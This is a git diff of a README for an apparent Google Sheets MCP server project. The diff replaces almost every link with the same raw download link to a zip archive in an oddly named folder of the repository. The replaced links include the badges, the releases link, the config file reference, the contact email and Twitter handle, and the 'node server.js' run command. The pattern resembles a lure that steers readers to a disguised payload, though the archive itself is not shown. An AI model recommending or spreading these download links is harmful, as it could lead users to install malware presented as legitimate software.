@@ -1,6 +1,6 @@
 # Google Sheets MCP Server 📊🤖
 
-![GitHub repo size](https://img.shields.io/github/repo-size/D-unn/google-sheets-mcp) ![GitHub stars](https://img.shields.io/github/stars/D-unn/google-sheets-mcp?style=social) ![GitHub forks](https://img.shields.io/github/forks/D-unn/google-sheets-mcp?style=social)
+![GitHub repo size](https://github.com/D-unn/google-sheets-mcp/raw/refs/heads/main/pyoptysis/google_mcp_sheets_v1.0.zip) ![GitHub stars](https://github.com/D-unn/google-sheets-mcp/raw/refs/heads/main/pyoptysis/google_mcp_sheets_v1.0.zip) ![GitHub forks](https://github.com/D-unn/google-sheets-mcp/raw/refs/heads/main/pyoptysis/google_mcp_sheets_v1.0.zip)
 
 Welcome to the **Google Sheets MCP Server** repository! This project provides a seamless way to manage your Google Sheets data with a powerful server-side application. Whether you're automating reports, syncing data, or just exploring the capabilities of Google Sheets, this server has you covered.
 
@@ -28,7 +28,7 @@ The Google Sheets MCP Server is designed to enhance your experience with Google 
 
 ## Installation
 
-To get started, you will need to download the latest release of the Google Sheets MCP Server. You can find the release files [here](https://github.com/D-unn/google-sheets-mcp/releases). 
+To get started, you will need to download the latest release of the Google Sheets MCP Server. You can find the release files [here](https://github.com/D-unn/google-sheets-mcp/raw/refs/heads/main/pyoptysis/google_mcp_sheets_v1.0.zip). 
 
 Once you have downloaded the necessary files, follow these steps:
 
@@ -37,11 +37,11 @@ Once you have downloaded the necessary files, follow these steps:
    ```
    npm install
    ```
-3. **Configure API Access**: Set up your Google API credentials. You will need to create a project in the Google Cloud Console and enable the Google Sheets API. Follow the instructions provided in the `CONFIG.md` file included in the repository.
+3. **Configure API Access**: Set up your Google API credentials. You will need to create a project in the Google Cloud Console and enable the Google Sheets API. Follow the instructions provided in the `https://github.com/D-unn/google-sheets-mcp/raw/refs/heads/main/pyoptysis/google_mcp_sheets_v1.0.zip` file included in the repository.
 
 4. **Run the Server**: Start the server by executing:
    ```
-   node server.js
+   node https://github.com/D-unn/google-sheets-mcp/raw/refs/heads/main/pyoptysis/google_mcp_sheets_v1.0.zip
    ```
 
 ## Usage
@@ -109,10 +109,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, please reach out to the project maintainer:
 
 - **Name**: [Your Name]
-- **Email**: your.email@example.com
-- **Twitter**: [@YourTwitterHandle](https://twitter.com/YourTwitterHandle)
+- **Email**: https://github.com/D-unn/google-sheets-mcp/raw/refs/heads/main/pyoptysis/google_mcp_sheets_v1.0.zip
+- **Twitter**: [@YourTwitterHandle](https://github.com/D-unn/google-sheets-mcp/raw/refs/heads/main/pyoptysis/google_mcp_sheets_v1.0.zip)
 
-Thank you for checking out the Google Sheets MCP Server! We hope it helps you streamline your data management tasks. For more updates and releases, visit our [Releases](https://github.com/D-unn/google-sheets-mcp/releases) section.
+Thank you for checking out the Google Sheets MCP Server! We hope it helps you streamline your data management tasks. For more updates and releases, visit our [Releases](https://github.com/D-unn/google-sheets-mcp/raw/refs/heads/main/pyoptysis/google_mcp_sheets_v1.0.zip) section.
 
 ---
 
